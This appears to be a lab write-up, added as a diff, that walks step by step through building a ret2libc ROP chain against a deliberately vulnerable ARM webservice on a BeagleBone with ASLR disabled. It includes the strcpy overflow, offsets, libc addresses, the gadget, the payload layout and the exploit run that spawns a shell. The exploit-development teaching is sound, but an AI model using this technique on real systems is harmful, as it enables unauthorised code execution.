@@ -1,0 +1,518 @@
+= ROP Chain Development Walkthrough
+:toc: left
+:toc-title: Contents
+:toclevels: 3
+:source-highlighter: rouge
+:icons: font
+:sectnums:
+
+This document traces the development of a working ret2libc ROP chain against
+the `POST /pi/start` endpoint of the ROP-vulnerable webservice running on a
+BeagleBone Black Rev C (ARM Cortex-A8, Debian 8, ASLR disabled).  Each step
+is reproducible using standard open-source tools: the GNU cross-toolchain,
+GDB with GEF, and the Rizin toolkit.
+
+== Target Overview
+
+The webservice is a non-PIE ARM32 binary compiled with:
+
+[source,bash]
+----
+-fno-stack-protector -no-pie -O0 -z execstack
+----
+
+Binary protections can be confirmed with `checksec`:
+
+[source,bash]
+----
+checksec --file=rop-webservice
+----
+
+Expected output:
+----
+RELRO           STACK CANARY      NX            PIE
+No RELRO        No canary found   NX disabled   No PIE
+----
+
+With ASLR disabled on the target (`randomize_va_space = 0`) and no PIE, all
+addresses — binary, stack, and shared libraries — are fixed across runs.
+
+== Confirming the Vulnerability
+
+The vulnerable handler in `src/handlers.cpp`:
+
+[source,cpp]
+----
+HttpResponse handle_pi_start(const std::string& body) {
+    char config_buf[64];
+    strcpy(config_buf, body.c_str());  // <1>
+    ...
+}
+----
+<1> `strcpy` has no length limit.  Any POST body longer than 63 bytes
+overflows `config_buf`.
+
+A quick proof-of-concept crash:
+
+[source,bash]
+----
+python3 -c "import sys; sys.stdout.buffer.write(b'A' * 200)" | \
+  curl -s -X POST --data-binary @- http://<bbb-ip>:8080/pi/start
+----
+
+The service process exits with `Segmentation fault` on the BBB terminal,
+confirming a stack smash.
+
+== Disassembling the Vulnerable Function
+
+Transfer the binary to the host for static analysis:
+
+[source,bash]
+----
+scp -O <user>@<bbb-ip>:~/rop-vuln-webservice/rop-webservice ./rop-webservice-bbb
+----
+
+=== With arm-linux-gnueabihf-objdump
+
+[source,bash]
+----
+arm-linux-gnueabihf-objdump -d rop-webservice-bbb | \
+  sed -n '/^[0-9a-f]\{8\} <_Z15handle_pi_startRKSs>/,/^[0-9a-f]\{8\} </p' | \
+  head -20
+----
+
+Key lines from the output:
+
+----
+00013408 <_Z15handle_pi_startRKSs>:
+   13408:  b580        push {r7, lr}      ; <1>
+   1340a:  b098        sub  sp, #96       ; <2>
+   1340c:  af00        add  r7, sp, #0    ; <3>
+   1340e:  6078        str  r0, [r7, #4]
+   13410:  6039        str  r1, [r7, #0]
+   1341a:  f107 0308   add.w r3, r7, #8   ; <4>
+   1341e:  4618        mov  r0, r3
+   13420:  4611        mov  r1, r2
+   13422:  f7fd ee4c   blx  110bc <strcpy@plt>
+   ...
+   134fe:  3760        adds r7, #96
+   13500:  46bd        mov  sp, r7
+   13502:  bd80        pop  {r7, pc}      ; <5>
+----
+<1> Saves the caller's frame pointer (r7) and the return address (LR) onto the
+    stack.  SP decreases by 8.
+<2> Allocates 96 bytes of local storage.  SP decreases by 96.  Total frame
+    depth: 104 bytes.
+<3> Sets r7 (the frame pointer) to the current SP — the bottom of the local
+    frame.
+<4> `config_buf` is at `r7 + 8`.  This address is passed as the destination
+    to `strcpy`.
+<5> The epilogue restores SP to `r7 + 96`, then pops the saved r7 and the
+    saved LR into PC.  Controlling the saved LR controls the next value of PC.
+
+=== With Rizin
+
+[source,bash]
+----
+rizin -A rop-webservice-bbb
+[0x00010f40]> s sym._Z15handle_pi_startRKSs
+[0x00013408]> pdf
+----
+
+Look for the same prologue/epilogue pattern.  Rizin labels the frame slots
+automatically; the saved LR appears as `var_saved_lr`.
+
+=== With Ghidra
+
+1. Open the binary in Ghidra and run Auto Analysis.
+2. Search for the symbol `handle_pi_start` in the Symbol Tree.
+3. In the decompiled view, the `strcpy` call and its 64-byte destination are
+   immediately visible.
+4. Switch to the Listing view to read the prologue — note `PUSH {r7,lr}` and
+   `SUB SP,#0x60` (96 decimal).
+
+== Finding the Exact Overflow Offset
+
+=== Stack frame layout
+
+From the disassembly:
+
+[cols="1,2,3"]
+|===
+|Address        |Contents                       |Size
+
+|`r7 + 0`       |stored arg1 (body `const&`)    |4 bytes
+|`r7 + 4`       |stored arg0 (response ptr)     |4 bytes
+|`r7 + 8`       |`config_buf[64]`               |64 bytes
+|`r7 + 72`      |`HttpResponse` object 1        |12 bytes
+|`r7 + 84`      |`HttpResponse` object 2        |12 bytes
+|`r7 + 96`      |saved r7 (caller frame ptr)    |4 bytes
+|`r7 + 100`     |*saved LR (return address)*    |4 bytes
+|===
+
+Distance from `config_buf[0]` to the saved LR:
+
+----
+(r7 + 100) - (r7 + 8) = 92 bytes
+----
+
+=== Verifying with GDB and GEF
+
+Run the service on the BBB and attach GDB from the host using `gdbserver`.
+
+On the BBB:
+
+[source,bash]
+----
+gdbserver 0.0.0.0:2345 ./rop-webservice
+----
+
+On the host:
+
+[source,bash]
+----
+gdb-multiarch rop-webservice-bbb
+(gdb) set architecture arm
+(gdb) target remote <bbb-ip>:2345
+(gdb) continue
+----
+
+In a third terminal, send a cyclic De Bruijn pattern:
+
+[source,bash]
+----
+python3 -c "
+from pwn import *
+sys.stdout.buffer.write(cyclic(200))
+" | curl -s -X POST --data-binary @- http://<bbb-ip>:8080/pi/start
+----
+
+GDB catches the `SIGSEGV`.  With GEF loaded the crash banner shows the PC
+value directly.  Without GEF:
+
+[source]
+----
+(gdb) info registers pc
+pc  0x61616174  ...
+(gdb) python from pwn import *; print(cyclic_find(0x61616174))
+92
+----
+
+The cyclic pattern offset of 92 confirms the static calculation.
+
+NOTE: The `HttpResponse` stack objects at `r7+72` and `r7+84` are
+reconstructed by their constructor _after_ `strcpy` runs.  Corrupting those
+bytes with padding does not crash the function before the epilogue; only the
+saved LR at offset 92 controls where execution goes.
+
+== Locating libc at Runtime
+
+With ASLR disabled, libc loads at the same base address every time.  Read it
+from a live process on the BBB:
+
+[source,bash]
+----
+ssh <user>@<bbb-ip> \
+  'cat /proc/$(pidof rop-webservice)/maps | grep "libc-"'
+----
+
+Output:
+
+----
+b6d5b000-b6e36000 r-xp 00000000 ... /lib/arm-linux-gnueabihf/libc-2.19.so  <1>
+b6e36000-b6e45000 ---p 000db000 ...
+b6e45000-b6e47000 r-xp 000da000 ...
+b6e47000-b6e48000 rwxp 000dc000 ...
+----
+<1> The first mapping starts at file offset 0, so runtime address = libc base
+    + file offset.  libc base: `0xb6d5b000`.
+
+== Finding system() and "/bin/sh"
+
+=== system() address
+
+[source,bash]
+----
+scp -O <user>@<bbb-ip>:/lib/arm-linux-gnueabihf/libc-2.19.so /tmp/libc-bbb.so
+arm-linux-gnueabihf-readelf -s /tmp/libc-bbb.so | grep " system"
+----
+
+Output:
+
+----
+  1444: 0002e211   56 FUNC  GLOBAL DEFAULT  13 system@@GLIBC_2.4
+----
+
+The symbol value `0x2e211` has bit 0 set — a Thumb function indicator in the
+ARM ELF convention.  The runtime address is therefore:
+
+----
+SYSTEM = 0xb6d5b000 + 0x2e211 = 0xb6d89211
+----
+
+Bit 0 is already set; loading this value into PC via `pop {pc}` will cause the
+CPU to continue in (or switch to) Thumb mode and begin executing at
+`0xb6d89210`, which is the real entry point of `system()`.
+
+=== "/bin/sh" string
+
+[source,bash]
+----
+strings -t x /tmp/libc-bbb.so | grep '/bin/sh'
+----
+
+Output:
+
+----
+  cd660 /bin/sh
+----
+
+Runtime address:
+
+----
+BINSH = 0xb6d5b000 + 0xcd660 = 0xb6e28660
+----
+
+== Finding a Valid ROP Gadget
+
+The goal is to load `BINSH` into r0 (the first argument register) before
+jumping to `system()`.  The cleanest gadget for this on ARM32 is one that pops
+a value from the stack into r0 and then jumps to whatever follows on the stack:
+
+----
+pop {r0, ..., pc}
+----
+
+=== Searching with objdump
+
+[source,bash]
+----
+arm-linux-gnueabihf-objdump -d /tmp/libc-bbb.so | \
+  grep -E "pop\s+\{.*r0.*pc\}"
+----
+
+Output:
+
+----
+   59cfc:  e8bd8011    pop {r0, r4, pc}
+----
+
+=== Verifying the instruction mode
+
+The surrounding disassembly context is critical:
+
+[source,bash]
+----
+arm-linux-gnueabihf-objdump -d /tmp/libc-bbb.so | grep -B8 "59cfc"
+----
+
+Output:
+
+----
+   59ce8:  25714001    ldrbcs  r4, [r1, #-1]!
+   59cec:  2551c001    ldrbcs  ip, [r1, #-1]
+   59cf0:  15603001    strbne  r3, [r0, #-1]!
+   59cf4:  25604001    strbcs  r4, [r0, #-1]!
+   59cf8:  2540c001    strbcs  ip, [r0, #-1]
+   59cfc:  e8bd8011    pop {r0, r4, pc}
+----
+
+The surrounding instructions are 4-byte ARM-mode encodings (conditional load/
+store with 32-bit operands).  This confirms that `0x59cfc` is *ARM-mode code*,
+not Thumb.
+
+IMPORTANT: The encoding `e8bd8011` means different things in the two CPU modes.
++
+* In *ARM mode*: `ldmia sp!, {r0, r4, pc}` — pops three words from the stack into
+  r0, r4, and PC.  This is the `pop {r0, r4, pc}` we want.
+* In *Thumb mode*: the first 16-bit halfword at `0x59cfc` is `0x8011`, which
+  decodes as `STRH r1, [r0, #0]` — a halfword store.  This is not a pop at all.
+
+Because the gadget is ARM code, the branch target must have **bit 0 clear**.
+When the Thumb-16 epilogue instruction `pop {r7, pc}` loads a value with bit 0
+clear into PC, the CPU switches from Thumb to ARM mode before executing the
+next instruction.  The gadget at `0x59cfc` therefore runs correctly in ARM mode.
+
+Gadget runtime address (no Thumb bit):
+
+----
+GADGET = 0xb6d5b000 + 0x59cfc = 0xb6db4cfc
+----
+
+=== Verification with Rizin
+
+[source,bash]
+----
+rizin /tmp/libc-bbb.so
+[0x00016bc8]> e asm.arch=arm
+[0x00016bc8]> e asm.bits=32
+[0x00016bc8]> s 0x59cfc
+[0x00059cfc]> pd 1
+----
+
+Rizin will disassemble the word at that offset as `ldm sp!, {r0, r4, pc}` in
+ARM mode, confirming the gadget.
+
+To check the mode flag attached to the nearest ARM mapping symbol:
+
+[source,bash]
+----
+[0x00059cfc]> is~$a   # list $a (ARM) mapping symbols
+----
+
+An `$a` symbol at an address before `0x59cfc` with no intervening `$t` symbol
+confirms the gadget is ARM code.
+
+== Composing the ROP Chain
+
+With all pieces resolved, the payload is:
+
+[cols="2,3,5"]
+|===
+|Stack slot (from config_buf[0]) |Value |Effect
+
+|bytes 0 – 91
+|`0x41` × 92 (`'A'` padding)
+|Fills `config_buf`, local variables, and the saved-r7 slot through to the
+ byte immediately before the saved LR.
+
+|bytes 92 – 95
+|`0xb6db4cfc` (GADGET, little-endian)
+|Overwrites the saved LR.  Epilogue `pop {r7, pc}` loads this into PC.
+ Bit 0 = 0 → CPU switches to ARM mode.
+
+|bytes 96 – 99
+|`0xb6e28660` (BINSH, little-endian)
+|First word the gadget pops.  `pop {r0, r4, pc}` loads this into r0 — the
+ address of the string `"/bin/sh"` in libc.
+
+|bytes 100 – 103
+|`0x4a554e4b` (`'JUNK'`, little-endian)
+|Second word the gadget pops.  Goes into r4, which is caller-saved and
+ unused by `system()`.
+
+|bytes 104 – 107
+|`0xb6d89211` (SYSTEM, little-endian)
+|Third word the gadget pops.  Loaded into PC.  Bit 0 = 1 → CPU switches back
+ to Thumb mode and begins executing `system()` at `0xb6d89210`.
+
+|===
+
+Execution flow:
+
+----
+strcpy overflow
+  → epilogue pop {r7, pc}     [Thumb-16]
+  → gadget  pop {r0, r4, pc} [ARM-32]   r0 = BINSH
+  → system()                  [Thumb]    system("/bin/sh")
+  → sh spawns on BBB terminal
+----
+
+The `system()` call inherits the webservice process's open file descriptors.
+Because the service was launched interactively from an SSH session, its
+stdin/stdout are the SSH terminal — the shell prompt appears there.
+
+== Running the Exploit
+
+=== Prerequisites
+
+. ASLR disabled on the BBB:
++
+[source,bash]
+----
+ssh <user>@<bbb-ip> \
+  "echo 0 | sudo tee /proc/sys/kernel/randomize_va_space"
+----
+
+. Terminal A — service running interactively on the BBB:
++
+[source,bash]
+----
+ssh <user>@<bbb-ip>
+cd ~/rop-vuln-webservice && ./rop-webservice
+----
+
+. Terminal B — Python venv activated on the host:
++
+[source,bash]
+----
+source exploit-env/bin/activate
+----
+
+=== Executing the exploit
+
+[source,bash]
+----
+python3 demos/get_shell.py http://<bbb-ip>:8080
+----
+
+Expected output in Terminal B:
+
+----
+[+] Service alive: {'running': False, 'digit': 0, 'place': 0}
+
+[*] ROP chain:
+    AAAA...  ← 92-byte padding to saved LR
+    0xb6db4cfc  ← pop {r0, r4, pc} (ARM, libc+0x59cfc, bit0=0)
+    0xb6e28660  ← "/bin/sh" (libc+0xcd660) → r0
+    JUNK        ← junk → r4 (discarded)
+    0xb6d89211  ← system() (libc+0x2e211, Thumb) → pc
+
+[*] Sending exploit → http://<bbb-ip>:8080/pi/start …
+[*] (ReadTimeout) — system() is running, shell active on BBB
+----
+
+A `ReadTimeout` (not a `ConnectionError`) indicates that the HTTP handler
+thread is alive and blocked inside `system()`, waiting for the child `sh`
+process to exit.  A `ConnectionError` means the service crashed before
+reaching `system()`.
+
+Expected output in Terminal A (BBB SSH session):
+
+----
+HTTP server listening on port 8080
+$ ps
+  PID TTY   TIME CMD
+  ... pts/3 ...  bash
+  ... pts/3 ...  rop-webservice
+  ... pts/3 ...  sh
+  ... pts/3 ...  ps
+$ whoami
+embed
+----
+
+The `sh` process confirms that `system("/bin/sh")` executed successfully.
+Type `exit` to return from the shell; the webservice handler thread will resume
+and the service process will segfault (its stack frame is corrupted), which is
+expected.
+
+== Key Pitfalls Encountered
+
+The following problems arose during development and are documented here to aid
+future analysts.
+
+=== Wrong offset (84 vs. 92)
+
+An empirical offset test revealed a crash at 84 bytes, which was initially
+taken as the return-address offset.  In reality, 84 bytes of padding reaches
+into the `HttpResponse` stack objects at `r7+84`, triggering a crash *before*
+the function returns.  The correct theoretical offset — derived from the
+disassembly — is 92 bytes (saved LR at `r7+100`, `config_buf` at `r7+8`).
+
+=== Non-executable ELF metadata (0x159a4)
+
+A byte-scan of the raw libc file found `0xbd15` (`pop {r0, r2, r4, pc}` in
+Thumb-16) at file offset `0x159a4`.  Jumping there caused a segfault because
+that offset falls in the pre-`.text` ELF metadata region, which is mapped but
+not executable.  Gadgets must be found via `objdump -d`, which only
+disassembles sections marked executable.
+
+=== Gadget in Thumb vs. ARM mode (0x59cfc)
+
+`objdump -d` found `pop {r0, r4, pc}` at `0x59cfc`.  The first attempt used
+the address with bit 0 set (`0xb6db4cfd`) to request Thumb mode.  In Thumb
+mode the bytes at `0x59cfc` decode as `STRH r1, [r0, #0]` — a store
+instruction — causing a segfault.  Inspecting the surrounding disassembly
+confirmed ARM mode; clearing bit 0 in the jump target caused the Thumb-mode
+epilogue to switch the CPU to ARM mode before executing the gadget, and the
+exploit succeeded.
